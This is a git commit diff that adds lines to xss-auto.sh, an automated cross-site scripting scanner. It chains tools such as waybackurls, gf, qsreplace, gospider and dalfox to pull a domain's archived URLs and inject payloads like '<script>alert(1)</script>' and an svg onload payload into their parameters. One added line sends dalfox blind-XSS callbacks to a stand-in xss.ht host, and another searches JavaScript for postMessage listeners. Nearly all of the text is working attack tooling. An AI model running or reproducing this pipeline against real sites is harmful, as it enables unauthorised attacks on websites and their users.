32c7c5ca0ba5d1587d991bc4c4341e80063b8255
Yogendra Singh <106531785+YOGENDRA-S@users.noreply.github.com>
2022-10-10 12:13:00 +0530

    Update xss-auto.sh

--- xss-auto.sh
+++ xss-auto.sh
@@ -20,12 +20,17 @@ echo $domain | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg on
 mv xssbug.txt onelinerOutput/
 
 
-
+gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee vvxss.txt
 
 
 cat alive.txt | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | tee xssbug3.txt
 mv xssbug3.txt onelinerOutput/
 
+waybackurls $domain | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
+
+waybackurls $domain | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.vvxss.txt
+
+cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
 
 # this is main command
 # echo http://testphp.vulnweb.con | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
